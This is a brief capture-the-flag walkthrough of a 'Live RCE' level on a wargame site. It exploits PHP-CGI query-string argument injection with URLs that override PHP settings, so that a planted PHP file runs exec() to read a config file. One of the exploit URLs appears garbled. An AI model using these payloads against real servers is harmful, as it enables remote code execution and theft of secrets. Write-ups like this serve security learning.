## Level 20 (Live RCE)
 
 - First, we search for vulnerabilities and exploit the security loophole of the website with this url : 
 
     `http://rce.warchall.net/?-s`
 
 - Next, we go to PuTTY to create a PHP file in /var/tmp  `cd /var/tmp`. Personally, I named it fichier.php `touch fichier.php`.
 - In this file, we will put the following code:
```
<?php 
exec("cat /home/level/20_live_rce/config.php", $out); 
print_r($out);
?>
```
 - Afterwards, we exploit the PHP configuration parameters on the server using :
 

       `https://rce.warchall.net/?-dallow%20url%20include=On+-dauto%20prepend%20file=/.../fichier.php=-n`

 - We finish by encoding the file with:
 

       `https://rce.warchall.net/index.php?-dsafe_mode%3dOff+-ddisable_functions%3dNULL+-dallow_url_fopen%3dOn+-dallow_url_include%3dOn+-dauto_prepend_file%3d/var/tmp/fichier.php`

 - Inspect the source code to find the solution
